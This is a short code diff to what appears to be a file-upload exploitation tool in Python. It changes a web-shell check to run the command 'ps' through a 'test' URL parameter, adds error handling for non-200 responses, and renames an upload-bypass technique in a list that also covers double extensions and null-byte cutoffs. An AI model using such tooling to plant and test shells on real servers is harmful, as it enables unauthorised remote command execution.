@@ -96,6 +96,7 @@ def debug(message, verbosity=None):
         if (verbosity > options.global_verbosity):
             return
 
+    print("[?] ", end="")
     print(message)
 
 def exit_success(url):
@@ -227,6 +228,10 @@ def test_accepted_formats(request_file, session, extensions_array):
     return accepted_extensions
 
 def check_success(response):
+    if (response.status_code != 200):
+        debug(response.text)
+        error(f"Response status code: {response.status_code}")
+
     global options
     if (options.true_regex != False):
         return bool(re.search(options.true_regex, response.text))
@@ -235,8 +240,8 @@ def check_success(response):
         return not bool(re.search(options.false_regex, response.text))
 
 def check_shell(url):
-    response = GET(url + "?test=echo%20'reflective_value_123321'")
-    if ("reflective_value_123321" in response.text):
+    response = GET(url + "?test=ps")
+    if ("PID" in response.text and "TTY" in response.text):
         return True
     else: 
         return False
@@ -396,7 +401,7 @@ def main():
         "double_extension_random_case",
         "reverse_double_extension",
         "null_byte_cutoff",
-        "overflow_cutoff",
+        "name_overflow_cutoff",
     ]
 
     modules = importlib.import_module("modules")
